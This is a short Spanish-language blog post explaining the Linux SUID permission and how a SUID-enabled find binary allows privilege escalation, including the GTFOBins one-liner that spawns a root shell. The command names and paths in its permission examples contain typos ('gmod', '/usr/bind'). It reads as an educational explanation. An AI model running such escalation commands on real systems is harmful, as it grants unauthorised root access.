---
date: 2021-09-07T00:22:05.000Z
layout: post
comments: true
title: Permisos SIUD
subtitle: 'y su explotación'
description: >-
image: >-
  http://imgfz.com/i/Q8pIHbz.png
optimized_image: >-
  http://imgfz.com/i/Q8pIHbz.png
category: ciberseguridad
tags:
  - permisos
  - linux
  - GNU
  - ciberseguridad
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---
Este tipo de permiso establece el ID de usuario del propietario, el cual se consigue agregando un 4 al momento de otorgar los permisos:
```
Si antes se realizaba
root> gmod 755 /usr/bind/find
[-rwxr-xr-x]

Ahora si quieres agregar el permiso SIUD, se debe colocar de la siguiente forma
root> gmod 4755 /usr/bind/find
[-rwsr-xr-x]

```

Ahora en este caso se lo asignamos a ```find```, el problema de esto es que esto es vulnerable pues si aplicamos el siguiente comando, podremos obtener acceso como root:

```
user@user:~$ find . -exec /bin/sh -p \; -quit
# whoami
root

```
>https://gtfobins.github.io/gtfobins/find/

Esto pasa debido a que a user se le asigna de manera temporal el permiso de root (propietario), y en el caso mostrado se abre una shell aprovechando la vulnerabilidad.
